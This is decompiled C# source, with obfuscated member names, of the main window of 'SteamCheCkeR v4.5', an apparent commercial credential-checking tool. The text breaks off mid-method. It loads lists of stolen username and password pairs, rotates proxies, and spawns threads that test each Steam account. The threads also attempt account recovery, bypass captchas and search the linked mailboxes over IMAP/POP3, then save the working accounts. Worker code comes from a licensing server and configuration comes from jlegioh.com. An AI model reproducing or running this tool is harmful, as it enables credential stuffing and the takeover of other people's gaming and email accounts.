using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using JLeGNet;
using JLeGNet.JLHelpers;
using JLeGNet.Net;
using Microsoft.Win32;
using SteamCheCkeR.Properties;
using SteamCheCkeR.Proxy;
using SteamCheCkeR.Windows;
using Vista_Api;
using Whush.Demo.License;
using Whush.Demo.Proxy;
using Xceed.Wpf.Toolkit;

namespace SteamCheCkeR
{
	// Token: 0x02000018 RID: 24
	public partial class MainWindow : Window
	{
		// Token: 0x06000140 RID: 320 RVA: 0x0000E7EC File Offset: 0x0000C9EC
		public MainWindow()
		{
			Class8.ah6VSoGzeNXX5();
			this.soundPlayer_0 = new SoundPlayer(SteamCheCkeR.Properties.Resources.smethod_0());
			this.timer_0 = new System.Windows.Forms.Timer();
			this.list_0 = new List<UserBase>();
			this.list_1 = new List<ThOneClass>();
			this.list_2 = new List<string>();
			this.qRwdNvjjem = new Dictionary<string, string>();
			this._rezLogList = new ObservableCollection<MainWindow.SearchRez>();
			this.dictionary_0 = new Dictionary<string, string>();
			this.string_1 = Directory.GetCurrentDirectory() + "\\Config\\FreeGameList.txt";
			this.string_2 = Directory.GetCurrentDirectory() + "\\Config\\MoneyGameList.txt";
			this.string_3 = Directory.GetCurrentDirectory() + "\\Config\\";
			this.random_0 = new Random();
			base..ctor();
			this.InitializeComponent();
			this.dataGridLog.ItemsSource = this._rezLogList;
			this.string_0 = Process.GetCurrentProcess().ProcessName;
		}

		// Token: 0x06000141 RID: 321 RVA: 0x0000E8D4 File Offset: 0x0000CAD4
		private void method_0()
		{
			this.int_0 = 0;
			this.int_1 = 0;
			this.int_3 = 0;
			this.int_4 = 0;
			this.int_5 = 0;
			this.int_7 = 0;
			this.int_2 = 0;
			this.int_6 = 0;
			this.int_8 = 0;
			this.int_9 = 0;
			this.int_10 = 0;
			this.int_11 = 0;
			this.int_12 = 0;
			this.labelNoTextCount.Content = this.int_8.ToString();
			this.labelAllGoodMailCount.Content = string.Format("{0}/{1}", this.int_10.ToString(), this.int_9.ToString());
			this.labelAllErrorCount.Content = string.Format("{0}/{1}", this.int_5.ToString(), this.int_12.ToString());
			this.labelAllBaddCount.Content = this.int_4.ToString();
			this.labelAllGoodCount.Content = this.int_3.ToString();
			this.labelAllcheckCount.Content = this.int_1.ToString();
			this.labelCapchaErrorCount.Content = string.Format("{0}/{1}", this.int_6.ToString(), this.int_11.ToString());
			this.labelRemainCount.Content = this.int_2.ToString();
		}

		// Token: 0x06000142 RID: 322 RVA: 0x0000EA2C File Offset: 0x0000CC2C
		public void startThreads(object className)
		{
			string nameClass = (string)className;
			Dispatcher dispatcher = base.Dispatcher;
			if (MainWindow.methodInvoker_0 == null)
			{
				MainWindow.methodInvoker_0 = new MethodInvoker(MainWindow.smethod_0);
			}
			dispatcher.Invoke(MainWindow.methodInvoker_0, new object[0]);
			this.assembly_0 = null;
			this.assembly_0 = ServerHelper.GetAssembly(nameClass);
			Dispatcher dispatcher2 = base.Dispatcher;
			if (MainWindow.methodInvoker_1 == null)
			{
				MainWindow.methodInvoker_1 = new MethodInvoker(MainWindow.smethod_1);
			}
			dispatcher2.Invoke(MainWindow.methodInvoker_1, new object[0]);
		}

		// Token: 0x06000143 RID: 323 RVA: 0x0000EAB4 File Offset: 0x0000CCB4
		private void method_1(object sender, RoutedEventArgs e)
		{
			this.bool_1 = false;
			this.method_0();
			if (!Directory.Exists(this.string_3))
			{
				Directory.CreateDirectory(this.string_3);
			}
			if (!File.Exists(this.string_1))
			{
				try
				{
					string text = new WebClient().DownloadString("http://jlegioh.com/Sender/GetConfig?typeConfig=FreeGameList");
					text = Regex.Replace(Regex.Match(text, "id=\"ref-1\">(.*)</SOAP-ENC:string>", RegexOptions.Singleline).Value, "id=\"ref-1\">(.*)</SOAP-ENC:string>", "$1", RegexOptions.Singleline);
					if (!string.IsNullOrEmpty(text))
					{
						File.WriteAllText(this.string_1, text);
					}
				}
				catch (Exception)
				{
				}
			}
			if (File.Exists(this.string_1))
			{
				string text2 = File.ReadAllText(this.string_1);
				if (!string.IsNullOrEmpty(text2))
				{
					text2 = CriptHelpers.Sha1Decript(text2, "string.IsNullOrEmpty(typeConfig)");
					if (!string.IsNullOrEmpty(text2))
					{
						foreach (string text3 in text2.Split(new char[]
						{
							'\n'
						}))
						{
							if (!string.IsNullOrEmpty(text3))
							{
								MainWindow._FreeGameList.Add(text3.Replace("\r", ""));
							}
						}
					}
				}
			}
			if (!File.Exists(this.string_2))
			{
				try
				{
					string text4 = new WebClient().DownloadString("http://jlegioh.com/Sender/GetConfig?typeConfig=MoneyGameList");
					text4 = Regex.Replace(Regex.Match(text4, "id=\"ref-1\">(.*)</SOAP-ENC:string>", RegexOptions.Singleline).Value, "id=\"ref-1\">(.*)</SOAP-ENC:string>", "$1", RegexOptions.Singleline);
					if (!string.IsNullOrEmpty(text4))
					{
						File.WriteAllText(this.string_2, text4);
					}
				}
				catch (Exception)
				{
				}
			}
			if (File.Exists(this.string_2))
			{
				string text5 = File.ReadAllText(this.string_2);
				if (!string.IsNullOrEmpty(text5))
				{
					text5 = CriptHelpers.Sha1Decript(text5, "string.IsNullOrEmpty(typeConfig)");
					if (!string.IsNullOrEmpty(text5))
					{
						foreach (string text6 in text5.Split(new char[]
						{
							'\n'
						}))
						{
							if (!string.IsNullOrEmpty(text6))
							{
								string text7 = text6.Split(new char[]
								{
									'|'
								})[0].Replace("\r", "").Trim();
								string value = text6.Split(new char[]
								{
									'|'
								})[1].Replace("\r", "").Trim();
								if (!string.IsNullOrEmpty(text7) && !string.IsNullOrEmpty(value) && !this.qRwdNvjjem.ContainsKey(text7))
								{
									this.qRwdNvjjem.Add(text7, value);
								}
							}
						}
					}
				}
			}
			MainWindow.LicenseCheck = false;
			Thread thread = new Thread(new ThreadStart(this.method_2));
			thread.Start();
			WindowCheckLic windowCheckLic = new WindowCheckLic();
			windowCheckLic.ShowDialog();
			if (this.object_0 == null)
			{
				System.Windows.MessageBox.Show("            Некорректная проверка лицензии!         \r\n      Обратитесь в Skype:jlsupport_online", "Обратитесь в Skype:jlsupport_online", MessageBoxButton.OK, MessageBoxImage.Exclamation);
				base.Close();
				return;
			}
			this.timer_0.Interval = 500;
			this.timer_0.Tick += this.timer_0_Tick;
			this.timer_0.Start();
			this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
		}

		// Token: 0x06000144 RID: 324 RVA: 0x0000EE20 File Offset: 0x0000D020
		private void method_2()
		{
			try
			{
				string text = null;
				if (JLLicenseInfo.LicenseCheck("SteamCheCkeR v4.5", ref text))
				{
					this.object_0 = JLLicenseInfo._JLProxyClass;
					MainWindow.workClass = JLLicenseInfo.workClass;
				}
			}
			catch (Exception)
			{
			}
			MainWindow.LicenseCheck = true;
		}

		// Token: 0x06000145 RID: 325 RVA: 0x0000EE70 File Offset: 0x0000D070
		private void timer_0_Tick(object sender, EventArgs e)
		{
			if (JLLicenseInfo.sendStatus)
			{
				this.SendStatusImage.BeginInit();
				this.SendStatusImage.Source = new BitmapImage(new Uri("Images\\greencircle.png", UriKind.RelativeOrAbsolute));
				this.SendStatusImage.EndInit();
			}
			else
			{
				this.SendStatusImage.BeginInit();
				this.SendStatusImage.Source = new BitmapImage(new Uri("Images\\redcircle.png", UriKind.RelativeOrAbsolute));
				this.SendStatusImage.EndInit();
			}
			if (this.bool_1)
			{
				this.FormatterStatusImage.BeginInit();
				this.FormatterStatusImage.Source = new BitmapImage(new Uri("Images\\basiccirclegrey.png", UriKind.RelativeOrAbsolute));
				this.FormatterStatusImage.EndInit();
				return;
			}
			if (ServerHelper.formatterStatus)
			{
				this.FormatterStatusImage.BeginInit();
				this.FormatterStatusImage.Source = new BitmapImage(new Uri("Images\\greencircle.png", UriKind.RelativeOrAbsolute));
				this.FormatterStatusImage.EndInit();
				return;
			}
			this.FormatterStatusImage.BeginInit();
			this.FormatterStatusImage.Source = new BitmapImage(new Uri("Images\\redcircle.png", UriKind.RelativeOrAbsolute));
			this.FormatterStatusImage.EndInit();
		}

		// Token: 0x06000146 RID: 326 RVA: 0x0000EF8C File Offset: 0x0000D18C
		private void method_3(object sender, EventArgs e)
		{
			foreach (Process process in Process.GetProcessesByName(this.string_0))
			{
				process.Kill();
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000EFC0 File Offset: 0x0000D1C0
		private void SoundOff_MouseDown(object sender, MouseButtonEventArgs e)
		{
			if (e.LeftButton == MouseButtonState.Pressed)
			{
				if (!this.bool_0)
				{
					this.SoundOff.BeginInit();
					this.SoundOff.Source = new BitmapImage(new Uri("Images\\sound_accept.png", UriKind.RelativeOrAbsolute));
					this.SoundOff.EndInit();
					this.soundPlayer_0.Play();
					this.SoundOff.ToolTip = "Выключить звук!";
					this.bool_0 = true;
					Class1.smethod_72(true);
					return;
				}
				this.SoundOff.BeginInit();
				this.SoundOff.Source = new BitmapImage(new Uri("Images\\sound_delete.png", UriKind.RelativeOrAbsolute));
				this.SoundOff.EndInit();
				this.SoundOff.ToolTip = "Включить звук!";
				this.bool_0 = false;
				Class1.smethod_72(false);
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000F08C File Offset: 0x0000D28C
		private void method_4()
		{
			Class1.smethod_4();
			Class1.smethod_74(Convert.ToInt32(this.TextBoxThCount.Text));
			Class1.smethod_76(Convert.ToInt32(this.TextBoxTimeout.Text));
			Class1.smethod_65(this.CheckBoxUseImap.IsChecked.Value);
			Class1.smethod_72(this.bool_0);
			Class1.CheckBoxCheckProxy = this.CheckBoxCheckProxy.IsChecked.Value;
			Class1.smethod_81();
		}

		// Token: 0x06000149 RID: 329 RVA: 0x0000F10C File Offset: 0x0000D30C
		private void ButtomNewProject_Click(object sender, RoutedEventArgs e)
		{
			Vista_Api.FolderBrowserDialog folderBrowserDialog = new Vista_Api.FolderBrowserDialog();
			folderBrowserDialog.ShowNewFolderButton = true;
			string text = Directory.GetCurrentDirectory() + "\\Project_" + DateTime.Now.ToString("dd_MM_yy-") + Regex.Replace(DateTime.Now.ToString("HH:mm:ss"), ":", "_");
			Directory.CreateDirectory(text);
			folderBrowserDialog.SelectedPath = text;
			if (folderBrowserDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
			{
				if (folderBrowserDialog.SelectedPath != text)
				{
					Directory.Delete(text);
				}
				Class1.smethod_77(null, folderBrowserDialog.SelectedPath);
				Class1.smethod_5(folderBrowserDialog.SelectedPath);
				this.CheckBoxUseImap.IsEnabled = true;
				this.buttonStart.IsEnabled = true;
				this.ButonAddAccs.IsEnabled = true;
				this.buttonAddProxy.IsEnabled = true;
				this.TextBoxThCount.Text = Class1.smethod_73().ToString();
				this.TextBoxTimeout.Text = Class1.smethod_75().ToString();
				this.buttonStart.IsEnabled = true;
				this.ButonAddAccs.IsEnabled = true;
				this.buttonAddProxy.IsEnabled = true;
				this.list_0.Clear();
				this._rezLogList.Clear();
				this.dictionary_0.Clear();
				this.labelAllAccsCount.Content = this.list_0.Count.ToString();
				this.method_0();
				this.method_4();
				this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
			}
			else
			{
				Directory.Delete(text);
			}
			folderBrowserDialog.Dispose();
		}

		// Token: 0x0600014A RID: 330 RVA: 0x0000F2C8 File Offset: 0x0000D4C8
		private void ButtomOpenProject_Click(object sender, RoutedEventArgs e)
		{
			if (!this.buttonStart.IsEnabled && !this.bool_1)
			{
				try
				{
					Process.Start(Class1.smethod_4());
				}
				catch (Exception)
				{
				}
				return;
			}
			Vista_Api.FolderBrowserDialog folderBrowserDialog = new Vista_Api.FolderBrowserDialog();
			folderBrowserDialog.SelectedPath = Directory.GetCurrentDirectory() + "\\";
			if (folderBrowserDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
			{
				Class1.smethod_77(null, folderBrowserDialog.SelectedPath);
				this.CheckBoxUseImap.IsEnabled = true;
				this.list_0.Clear();
				foreach (string user in Class1.smethod_82(folderBrowserDialog.SelectedPath))
				{
					this.list_0.Add(new UserBase(user));
				}
				string path = Class1.smethod_9();
				IEnumerable<UserBase> source = this.list_0;
				if (MainWindow.func_0 == null)
				{
					MainWindow.func_0 = new Func<UserBase, string>(MainWindow.smethod_2);
				}
				File.WriteAllLines(path, source.Select(MainWindow.func_0).ToList<string>());
				if (Class1.smethod_78())
				{
					this.labelAllAccsCount.Content = this.list_0.Count.ToString();
					this.CheckBoxUseImap.IsChecked = new bool?(Class1.smethod_64());
					this.CheckBoxFirstCheckMail.IsChecked = new bool?(Class1.smethod_25());
					if (Class1.smethod_64())
					{
						this.CheckBoxUseImap_Click(null, null);
					}
					this.TextBoxThCount.Text = Class1.smethod_73().ToString();
					this.TextBoxTimeout.Text = Class1.smethod_75().ToString();
					this.textBoxSearch.Text = Class1.textBoxSearch;
					if (Class1.smethod_71())
					{
						this.SoundOff.BeginInit();
						this.SoundOff.Source = new BitmapImage(new Uri("Images\\sound_accept.png", UriKind.RelativeOrAbsolute));
						this.SoundOff.EndInit();
						this.soundPlayer_0.Play();
						this.SoundOff.ToolTip = "Выключить звук!";
						this.bool_0 = true;
						Class1.smethod_72(true);
					}
				}
			}
			this.buttonStart.IsEnabled = true;
			this.ButonAddAccs.IsEnabled = true;
			this.buttonAddProxy.IsEnabled = true;
			folderBrowserDialog.Dispose();
			ProxyLoadWindow proxyLoadWindow = new ProxyLoadWindow(this.object_0);
			proxyLoadWindow.ShowDialog();
			this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
		}

		// Token: 0x0600014B RID: 331 RVA: 0x0000F55C File Offset: 0x0000D75C
		private void ButonAddAccs_Click(object sender, RoutedEventArgs e)
		{
			if (!string.IsNullOrEmpty(Class1.smethod_4()))
			{
				try
				{
					if (File.Exists(Class1.smethod_9()) && File.ReadAllLines(Class1.smethod_9()).Any<string>() && System.Windows.MessageBox.Show("Хотите перезаписать последний проект?", "Вопросик!", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No)
					{
						return;
					}
				}
				catch (Exception)
				{
					return;
				}
			}
			Microsoft.Win32.OpenFileDialog openFileDialog = new Microsoft.Win32.OpenFileDialog();
			openFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			openFileDialog.Filter = "text files|*.txt";
			if (openFileDialog.ShowDialog() == true)
			{
				Class1.smethod_14(openFileDialog.FileName);
				this.list_0.Clear();
				foreach (string user in File.ReadAllLines(Class1.smethod_13()).Distinct<string>())
				{
					this.list_0.Add(new UserBase(user));
				}
				if (Class1.smethod_4() != null)
				{
					File.Copy(Class1.smethod_13(), Class1.smethod_9(), true);
				}
				this.labelAllAccsCount.Content = "0";
				this.labelAllAccsCount.Content = this.list_0.Count.ToString();
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x0000F6AC File Offset: 0x0000D8AC
		private void buttonAddProxy_Click(object sender, RoutedEventArgs e)
		{
			WindowProxy windowProxy = new WindowProxy(this.object_0);
			windowProxy.ShowDialog();
			this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
		}

		// Token: 0x0600014D RID: 333 RVA: 0x0000F704 File Offset: 0x0000D904
		private void buttonAddProxy_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
		{
			if (System.Windows.MessageBox.Show("Хотите автоматически загрузить прокси по всем ссылкам?", "Вопросик?", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes)
			{
				ProxyLoadWindow proxyLoadWindow = new ProxyLoadWindow(this.object_0);
				proxyLoadWindow.ShowDialog();
				this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x0000F770 File Offset: 0x0000D970
		private void CheckBoxLog_Click(object sender, RoutedEventArgs e)
		{
			if (this.CheckBoxLog.IsChecked.Value)
			{
				base.MaxWidth = 785.0;
				base.MinWidth = 785.0;
				base.Width = 785.0;
				this.dataGridLog.Height = 285.0;
				this.dataGridLog.Width = 444.0;
				return;
			}
			this.dataGridLog.Height = 0.0;
			this.dataGridLog.Width = 0.0;
			base.MaxWidth = 320.0;
			base.MinWidth = 320.0;
			base.Width = 320.0;
		}

		// Token: 0x0600014F RID: 335 RVA: 0x0000F840 File Offset: 0x0000DA40
		private void SaveAllData_MouseDoubleClick(object sender, MouseButtonEventArgs e)
		{
			List<string> list = new List<string>();
			foreach (object obj in ((IEnumerable)this.dataGridLog.Items))
			{
				MainWindow.SearchRez searchRez = null;
				try
				{
					searchRez = (MainWindow.SearchRez)obj;
				}
				catch (Exception)
				{
					continue;
				}
				if (searchRez != null)
				{
					string account = searchRez.Account;
					if (this.dictionary_0.ContainsKey(account))
					{
						list.Add(this.dictionary_0[account]);
					}
				}
			}
			if (list.Count == 0)
			{
				System.Windows.MessageBox.Show("Пустой результат!", "Проблемка)", MessageBoxButton.OK, MessageBoxImage.Hand);
				return;
			}
			Microsoft.Win32.SaveFileDialog saveFileDialog = new Microsoft.Win32.SaveFileDialog();
			saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			saveFileDialog.Title = "Укажите куда сохранит результат!";
			saveFileDialog.Filter = "text file | *.txt";
			if (saveFileDialog.ShowDialog().Value)
			{
				File.WriteAllLines(saveFileDialog.FileName, list);
				System.Windows.MessageBox.Show("Данные успешно сохранены!", "ОК)", MessageBoxButton.OK, MessageBoxImage.Asterisk);
			}
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000F95C File Offset: 0x0000DB5C
		private void CopyAllData_MouseDoubleClick(object sender, MouseButtonEventArgs e)
		{
			string text = "";
			foreach (object obj in ((IEnumerable)this.dataGridLog.Items))
			{
				MainWindow.SearchRez searchRez = null;
				try
				{
					searchRez = (MainWindow.SearchRez)obj;
				}
				catch (Exception)
				{
					continue;
				}
				if (searchRez != null)
				{
					string account = searchRez.Account;
					if (this.dictionary_0.ContainsKey(account))
					{
						text += this.dictionary_0[account];
					}
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				System.Windows.MessageBox.Show("Пустой результат!", "Проблемка)", MessageBoxButton.OK, MessageBoxImage.Hand);
				return;
			}
			System.Windows.Forms.Clipboard.SetText(text);
			System.Windows.MessageBox.Show("Данные успешно помещены в буфер!", "ОК)", MessageBoxButton.OK, MessageBoxImage.Asterisk);
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000FA38 File Offset: 0x0000DC38
		private void buttonStop_Click(object sender, RoutedEventArgs e)
		{
			this.bool_1 = true;
			this.object_0.GetType().InvokeMember("TimerStatus", BindingFlags.InvokeMethod, null, this.object_0, new object[]
			{
				false
			});
			foreach (ThOneClass thOneClass in this.list_1)
			{
				try
				{
					thOneClass.ThCurent.Abort();
				}
				catch (Exception)
				{
				}
			}
			this.int_7 = 1001;
			this.ButtomNewProject.IsEnabled = true;
			this.buttonAddProxy.IsEnabled = true;
			this.ButonAddAccs.IsEnabled = true;
			this.buttonStart.IsEnabled = true;
			this.buttonStop.IsEnabled = false;
			this.TextBoxThCount.IsReadOnly = false;
			this.TextBoxTimeout.IsReadOnly = false;
			this.CheckBoxCheckProxy.IsEnabled = true;
			this.CheckBoxUseImap.IsEnabled = true;
			this.CheckBoxFirstCheckMail.IsEnabled = true;
			this.LabelSettings.IsEnabled = true;
			this.LabellogViewer.IsEnabled = true;
			this.LabelLikeGames.IsEnabled = true;
			this.textBoxSearch.IsReadOnly = false;
			if (this.int_0 != this.int_1)
			{
				try
				{
					foreach (ThOneClass thOneClass2 in this.list_1)
					{
						if (thOneClass2.UserBase != null)
						{
							string user = thOneClass2.UserBase.user;
							if (!string.IsNullOrEmpty(user))
							{
								this.list_0.Add(new UserBase(user));
							}
						}
					}
					this.list_0 = this.list_0.Distinct<UserBase>().ToList<UserBase>();
					this.labelAllAccsCount.Content = this.list_0.Count.ToString();
				}
				catch (Exception)
				{
				}
			}
			this.labelAllAccsCount.Content = this.list_0.Count.ToString();
			try
			{
				string path = Class1.smethod_9();
				IEnumerable<UserBase> source = this.list_0;
				if (MainWindow.func_1 == null)
				{
					MainWindow.func_1 = new Func<UserBase, string>(MainWindow.smethod_3);
				}
				File.WriteAllLines(path, source.Select(MainWindow.func_1).ToList<string>());
			}
			catch (Exception)
			{
			}
			try
			{
				string path2 = Class1.smethod_11();
				IEnumerable<UserBase> source2 = this.list_0;
				if (MainWindow.func_2 == null)
				{
					MainWindow.func_2 = new Func<UserBase, string>(MainWindow.smethod_4);
				}
				File.WriteAllLines(path2, source2.Select(MainWindow.func_2).ToList<string>());
			}
			catch (Exception)
			{
			}
			System.Windows.MessageBox.Show("Проверка остановлена или завершена!!!", "Завершено!!!", MessageBoxButton.OK, MessageBoxImage.Asterisk);
		}

		// Token: 0x06000152 RID: 338 RVA: 0x0000FD18 File Offset: 0x0000DF18
		private void buttonStart_Click(object sender, RoutedEventArgs e)
		{
			if (this.list_0.Count == 0)
			{
				System.Windows.MessageBox.Show("Добавьте аккаунты !!!", "Oшибочка!", MessageBoxButton.OK, MessageBoxImage.Hand);
				return;
			}
			if (Class1.smethod_4() == null)
			{
				System.Windows.MessageBox.Show("Создайте проект !!!", "Oшибочка!", MessageBoxButton.OK, MessageBoxImage.Hand);
				return;
			}
			this.ButtomNewProject.IsEnabled = false;
			this.buttonAddProxy.IsEnabled = false;
			this.ButonAddAccs.IsEnabled = false;
			this.buttonStart.IsEnabled = false;
			this.buttonStop.IsEnabled = true;
			this.TextBoxThCount.IsReadOnly = true;
			this.TextBoxTimeout.IsReadOnly = true;
			this.ButtomNewProject.IsEnabled = false;
			this.CheckBoxCheckProxy.IsEnabled = false;
			this.CheckBoxUseImap.IsEnabled = false;
			this.CheckBoxFirstCheckMail.IsEnabled = false;
			this.LabelSettings.IsEnabled = false;
			this.LabellogViewer.IsEnabled = false;
			this.LabelLikeGames.IsEnabled = false;
			this.textBoxSearch.IsReadOnly = true;
			this.method_0();
			this.bool_1 = false;
			this.int_0 = this.list_0.Count;
			this.int_2 = this.int_0;
			this.labelRemainCount.Content = this.int_2.ToString();
			if (Class1.smethod_4() != null)
			{
				try
				{
					string path = Class1.smethod_9();
					IEnumerable<UserBase> source = this.list_0;
					if (MainWindow.func_3 == null)
					{
						MainWindow.func_3 = new Func<UserBase, string>(MainWindow.smethod_5);
					}
					File.WriteAllLines(path, source.Select(MainWindow.func_3).ToList<string>());
				}
				catch (Exception)
				{
				}
			}
			int num = Convert.ToInt32(this.TextBoxThCount.Text);
			int num2 = Convert.ToInt32(this.TextBoxTimeout.Text);
			this.method_4();
			this.list_1.Clear();
			this._rezLogList.Clear();
			this.dictionary_0.Clear();
			this.list_2.Clear();
			Thread thread = new Thread(new ParameterizedThreadStart(this.startThreads));
			thread.Start("JLSteamCheCkeR45");
			WindowStart windowStart = new WindowStart();
			windowStart.ShowDialog();
			Assembly assembly = this.assembly_0;
			if (this.assembly_0 != null)
			{
				Thread thread2 = new Thread(new ParameterizedThreadStart(this.startThreads));
				thread2.Start("JLeGEmailNetFull");
				WindowStart windowStart2 = new WindowStart();
				windowStart2.ShowDialog();
			}
			if (this.assembly_0 == null)
			{
				System.Windows.MessageBox.Show("            Некорректная лицензия!         \r\n      Обратитесь в Skype:jlsupport_online", "Обратитесь в Skype:jlsupport_online", MessageBoxButton.OK, MessageBoxImage.Exclamation);
				this.buttonStop_Click(null, null);
				return;
			}
			if ((int)this.object_0.GetType().InvokeMember("AllProxyCount", BindingFlags.InvokeMethod, null, this.object_0, new object[0]) != 0)
			{
				this.object_0.GetType().InvokeMember("TimerStatus", BindingFlags.InvokeMethod, null, this.object_0, new object[]
				{
					true
				});
			}
			for (int i = 0; i < num; i++)
			{
				Thread thread3 = new Thread(new ThreadStart(this.method_5));
				thread3.Name = i.ToString();
				Class1.emailSearchSetting_0 = new EmailSearchSetting(this.textBoxSearch.Text);
				Class1.emailSearchSetting_0.UseImapSearch = Class1.smethod_64();
				if (Class1.smethod_64())
				{
					Class1.emailSearchSetting_0.UsePop3Search = true;
				}
				Class1.emailSearchSetting_0.SaveFullText = true;
				object emailClass = this.assembly_0.CreateInstance("JLeGEmailNetFull", false, BindingFlags.InvokeMethod, null, new object[]
				{
					num2,
					this.textBoxSearch.Text,
					null,
					DateTime.Now,
					DateTime.Now
				}, null, null);
				this.list_1.Add(new ThOneClass(thread3, i, assembly.CreateInstance("JLSteamCheCkeR45", false, BindingFlags.InvokeMethod, null, new object[]
				{
					num2,
					MainWindow._FreeGameList,
					this.qRwdNvjjem
				}, null, null), emailClass, this.object_0));
				thread3.Start();
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00010128 File Offset: 0x0000E328
		private void method_5()
		{
			MethodInvoker methodInvoker = null;
			MethodInvoker methodInvoker2 = null;
			MethodInvoker methodInvoker3 = null;
			ThOneClass thOneClass = this.list_1[Convert.ToInt32(Thread.CurrentThread.Name)];
			while (!this.bool_1)
			{
				UserBase userBase = null;
				bool flag = false;
				MainWindow obj;
				try
				{
					obj = this;
					Monitor.Enter(this, ref flag);
					thOneClass.ProxyClient = (ProxyClient)this.object_0.GetType().InvokeMember("GetProxyClient", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
				}
				finally
				{
					if (flag)
					{
						Monitor.Exit(obj);
					}
				}
				if (Class1.CheckBoxCheckProxy && thOneClass.ProxyClient != null && !(bool)this.object_0.GetType().InvokeMember("CheckProxy", BindingFlags.InvokeMethod, null, this.object_0, new object[]
				{
					thOneClass.ProxyClient
				}))
				{
					lock (this)
					{
						this.int_5++;
						Dispatcher dispatcher = base.Dispatcher;
						if (methodInvoker == null)
						{
							methodInvoker = new MethodInvoker(this.method_8);
						}
						dispatcher.Invoke(methodInvoker, new object[0]);
						continue;
					}
				}
				lock (this)
				{
					if (this.list_0.Count > 0)
					{
						userBase = this.list_0[0];
						this.list_0.RemoveAt(0);
					}
					if (thOneClass.ProxyClient != null)
					{
						Dispatcher dispatcher2 = base.Dispatcher;
						if (methodInvoker2 == null)
						{
							methodInvoker2 = new MethodInvoker(this.method_9);
						}
						dispatcher2.Invoke(methodInvoker2, new object[0]);
					}
				}
				if (userBase == null)
				{
					Thread.Sleep(200);
				}
				else
				{
					thOneClass.UserBase = userBase;
					List<string> list = null;
					if (!userBase.user.Contains('|'))
					{
						bool flag4 = (bool)thOneClass.CurentWorkClass.GetType().InvokeMember("StartCheckRecovery", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
						{
							userBase,
							Class1.emailSearchSetting_0,
							thOneClass.ProxyClient,
							Class1.smethod_25()
						});
						if (Class1.smethod_25() && userBase.AtachEmailStatus != AtachStatus.OK)
						{
							EmailCheckColection emailCheckColection = new EmailCheckColection();
							emailCheckColection.AtachStatus = userBase.AtachEmailStatus;
							lock (this)
							{
								this.method_7(emailCheckColection, thOneClass, userBase);
								continue;
							}
						}
						if (Class1.CheckBoxRecoveryAcc)
						{
							userBase = (UserBase)thOneClass.CurentWorkClass.GetType().InvokeMember("CheckAccRestore", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
							{
								userBase,
								Class1.emailSearchSetting_0,
								Class1.CheckBoxFindAcc,
								Class1.CheckBoxUseAntigate,
								Class1.smethod_2(),
								thOneClass.ProxyClient
							});
							string userText = userBase.userText;
							if (string.IsNullOrEmpty(userText))
							{
								lock (this)
								{
									this.method_6(userText, userBase.userText, userBase.otherDataString, userBase, thOneClass);
									continue;
								}
							}
							if (userText == "GoToFindInMail")
							{
								if (Class1.CheckBoxFindAcc)
								{
									goto IL_513;
								}
								EmailCheckColection emailCheckColection = new EmailCheckColection();
								if (userBase.AtachEmailStatus == AtachStatus.OK)
								{
									emailCheckColection.AtachStatus = userBase.AtachEmailStatus;
								}
								else
								{
									emailCheckColection.AtachStatus = AtachStatus.BAD;
								}
								lock (this)
								{
									this.method_7(emailCheckColection, thOneClass, userBase);
									continue;
								}
							}
							if (!(userText == "captcha") && !(userText == "SteamCapcha"))
							{
								if (userText == "Public")
								{
									EmailCheckColection emailCheckColection = new EmailCheckColection();
									emailCheckColection.AtachStatus = AtachStatus.Public;
									lock (this)
									{
										this.method_7(emailCheckColection, thOneClass, userBase);
										continue;
									}
								}
								if (userText == "BAD")
								{
									EmailCheckColection emailCheckColection = new EmailCheckColection();
									if (userBase.AtachEmailStatus == AtachStatus.OK)
									{
										emailCheckColection.AtachStatus = userBase.AtachEmailStatus;
									}
									else
									{
										emailCheckColection.AtachStatus = AtachStatus.BAD;
									}
									lock (this)
									{
										this.method_7(emailCheckColection, thOneClass, userBase);
										continue;
									}
								}
								if (userText.Contains("SendOk"))
								{
									list = new List<string>();
									foreach (string text in userText.Split(new char[]
									{
										'|'
									}))
									{
										if (!string.IsNullOrEmpty(text) && !(text == "SendOk"))
										{
											string text2 = text.Trim();
											if (!string.IsNullOrEmpty(text2))
											{
												list.Add(text2);
											}
										}
									}
									goto IL_612;
								}
							}
							else
							{
								lock (this)
								{
									this.method_6(userText, userBase.userText, userBase.otherDataString, userBase, thOneClass);
									continue;
								}
							}
						}
						IL_513:
